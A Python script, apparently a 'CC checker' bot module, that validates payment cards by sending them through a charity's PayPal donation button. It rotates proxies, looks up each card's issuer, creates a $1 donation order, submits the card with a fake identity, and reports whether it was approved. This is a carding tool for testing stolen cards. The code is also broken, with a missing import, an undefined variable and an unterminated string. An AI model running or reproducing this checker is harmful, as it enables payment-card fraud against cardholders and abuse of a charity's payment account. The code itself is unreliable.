import requests
import random
import json
import time
import base64
from bs4 import BeautifulSoup
from datetime import datetime, timedelta


def paypal(username, numero, mes, ano, cvv): 
  proxyies = "proxy.txt"
  inicio = time.time()
  
  #BIN CHECKER
  
  bin = numero[:6]
  
  b_data = requests.get(f"https://bins.antipublic.cc/bins/{bin}").json()
  
  pais = b_data['country_name']
  flag = b_data['country_flag']
  bank = b_data['bank']
  brand = b_data['brand']
  level = b_data['level']
  tipo = b_data['type']
  

  
  
  with open("proxy.txt", "r") as f:
    proxy_list = [line.strip() for line in f if line.strip()]

  proxy_raw = random.choice(proxy_list)
  
    
  session = requests.Session()
  proxie = {
    "http": f"http://{proxy_raw}",
    "https": f"http://{proxy_raw}"
  }
  
  head = {

        "Host": "www.paypal.com",

        "referer": "https://onehealthworkforceacademies.org/",
    }

   r = session.post(
        "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=blue&style.shape=pill&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVuMjlWSEhpd2ljZWxsOWx6NGd4Yi1EaV9uNHhlUlkzWkdpd3l1UVk2bV9MUUlrTmNaMHh5ZEFnUE1NbmpFelFxTUNVblBtZ0ZHY2FIZmgmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh&sdkCorrelationID=f308033f5c550&storageID=uid_e775778837_mja6mzg6mty&sessionID=uid_1a87d97aea_mja6mzg6mty&buttonSessionID=uid_1e550b2bd0_mja6mzg6mty&env=production&buttonSize=small&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false",
    headers=head)
    token = r.text
    match = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', token)
    token = match.group(1)
    print(token)
    
    head2 = {
        

        "content-type": "application/json",
        "authorization": f"Bearer {token}",
        "referer": "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=blue&style.shape=pill&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVuMjlWSEhpd2ljZWxsOWx6NGd4Yi1EaV9uNHhlUlkzWkdpd3l1UVk2bV9MUUlrTmNaMHh5ZEFnUE1NbmpFelFxTUNVblBtZ0ZHY2FIZmgmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh&sdkCorrelationID=f308033f5c550&storageID=uid_d275d9fa3c_mja6mzy6mtg&sessionID=uid_1480210721_mja6mzy6mtk&buttonSessionID=uid_cabcbc1a43_mja6mzy6mtk&env=production&buttonSize=small&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false"
    }
    
    post2 = '{"purchase_units":[{"amount":{"currency_code":"USD","value":"1","breakdown":{"item_total":{"currency_code":"USD","value":"1"}}},"items":[{"name":"item name","unit_amount":{"currency_code":"USD","value":"1"},"quantity":"1","category":"DONATION"}],"description":"OHWA Donation"}],"intent":"CAPTURE","application_context":{}}'
    
    r2 = session.post("https://www.paypal.com/v2/checkout/orders", headers=head2, data=post2)
    id = r2.text
    match = re.search(r'"id"\s*:\s*"([^"]+)"', id)
    id_ = match.group(1)
    
    post3 = {

        "query": f"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {{\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {{\n                flags {{\n                    is3DSecureRequired\n                }}\n                cart {{\n                    intent\n                    cartId\n                    buyer {{\n                        userId\n                        auth {{\n                            accessToken\n                        }}\n                    }}\n                    returnUrl {{\n                        href\n                    }}\n                }}\n                paymentContingencies {{\n                    threeDomainSecure {{\n                        status\n                        method\n                        redirectUrl {{\n                            href\n                        }}\n                        parameter\n                    }}\n                }}\n            }}\n        }}\n    ",

        "variables": {
            "token": id_,
            "card": {
                "cardNumber": cc,
                "expirationDate": f"{mes}/{ano}",
                "postalCode": "10027",
                "securityCode": cvv,
            },
            "phoneNumber": "19006318646,
            "firstName": "Sachio",
            "lastName": "YT",
            "billingAddress": {
                "givenName": "Sachio",
                "familyName": "YT",
                "line1": "118 W 132nd St",
                "line2": None,
             "city": "New York",
             "state": "NY",
                "postalCode": "10027",
               "country": "US",
            },
            "shippingAddress": {
                "givenName": "Sachio",
               "familyName": "YT",
               "line1": "118 W 132nd St",
               "line2": None,
              "city": "New York",
              "state": "NY",
              "postalCode": "10027",
               "country": "US",
           },
           "email": "sachiopremiun@gmail.com",
            "currencyConversionType": "PAYPAL",
        },
        "operationName": None,
    }
    
    head3 = {

     "content-type": "application/json",
       "referer": f"https://www.paypal.com/smart/card-fields?sessionID=uid_1480210721_mja6mzy6mtk&buttonSessionID=uid_cabcbc1a43_mja6mzy6mtk&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVuMjlWSEhpd2ljZWxsOWx6NGd4Yi1EaV9uNHhlUlkzWkdpd3l1UVk2bV9MUUlrTmNaMHh5ZEFnUE1NbmpFelFxTUNVblBtZ0ZHY2FIZmgmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&disable-card=&token={id_}",
    }
    
    r3 = session.post("https://www.paypal.com/graphql?fetch_credit_form_submit", headers=head3, json=post3, )
    t3 = r3.text
    
    match = re.search(r'"message"\s*:\s*"([^"]+)"', t3)

    match1 = re.search(r'"code"\s*:\s*"([^"]+)"', t3)
    
    msg = match.group(1)
    code = match1.group(1)
    
    end = time.time()
    tiempo = str(inicio - end)[1:5]

    
    return (
    f"⋄ ︱ <b>CC</b>: {numero}|{mes}|{ano}|{cvv}\n"
    f"⋄ ︱ <b>Status</b>: {msg}\n"
    f"⋄ ︱ <b>Response</b>: {code}\n"
    f"- - - - - - - - - - - - - - -\n"
    f"⋄ ︱ <b>Country</b>: {pais} - {flag}\n"
    f"⋄ ︱ <b>Bank</b>: {bank}\n"
    f"⋄ ︱ <b>Type</b>: {brand} - {level} - {tipo} \n"
    f"- - - - - - - - - - - - - - -\n"
    f"⋄ ︱ <b>Gate</b>: Stripe Auth\n"
    f"⋄ ︱ <b>Time</b>: {tiempo}\n"
    f"⋄ ︱ <b>Checked By</b> : {username}\n"
  )